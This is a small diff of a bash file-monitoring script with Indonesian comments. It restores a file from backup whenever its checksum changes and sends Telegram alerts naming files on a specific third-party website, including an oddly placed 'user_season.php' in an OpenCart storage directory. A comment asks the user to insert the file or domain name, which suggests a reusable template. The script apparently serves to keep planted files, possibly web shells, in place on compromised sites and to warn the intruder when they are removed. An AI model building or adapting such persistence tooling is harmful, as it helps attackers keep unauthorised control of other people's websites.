@@ -39,8 +39,8 @@ monitor_file() {
             # Jika checksum berbeda, kembalikan file index.php dari backup
             echo "Change, mengembalikan backup..."
             cp "$BACKUP_FILE" "$INDEX_FILE"
-            echo "https://www.ideastile.it/system/admin.php."
-            send_telegram_notification "https://www.ideastile.it/system/admin.php. File admin.php Sudah dikembalikan ke versi backup." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
+            echo "https://www.ideastile.it/."
+            send_telegram_notification "user_season.php Di HAPUS. https://www.ideastile.it/system/storage/modification/admin/controller/catalog/user_season.php." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
         fi
 
         # Tunggu 30 detik sebelum pengecekan selanjutnya
